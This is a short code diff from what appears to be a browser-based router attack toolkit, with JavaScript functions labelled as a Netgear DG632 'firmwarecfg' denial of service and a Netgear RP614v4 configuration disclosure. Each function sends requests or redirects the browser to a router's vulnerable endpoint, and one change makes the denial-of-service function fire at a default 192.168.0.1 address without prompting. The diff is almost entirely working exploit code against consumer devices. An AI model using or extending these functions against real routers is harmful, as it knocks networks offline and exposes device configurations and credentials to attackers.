@@ -1628,8 +1628,8 @@ setTimeout(function() {document.t233.submit();},6000);
 }
 
 // Netgear DG632 'firmwarecfg' denial of service
-function netdos() {
-	ip=prompt("IP:");
+function netdos(ip) {
+	ip = ip || "192.168.0.1";
 	document.netdos.action="http://"+ip+"/cgi-bin/firmwarecfg";
 	if (ip==null || ip==""){}else{
 		document.netdos.submit();
@@ -1675,9 +1675,8 @@ function netcon() {
 // Netear RP614v4 config disclosure
 function netconb() {
 	ip=prompt("IP:");
-	port=prompt("Port:");
 	if (ip==null || ip==""){}else{
-		document.location="http://"+ip+"/vgn/jsp/netgear.cfg"+port;
+		document.location="http://"+ip+"/vgn/jsp/netgear.cfg";
 	}
 }
 
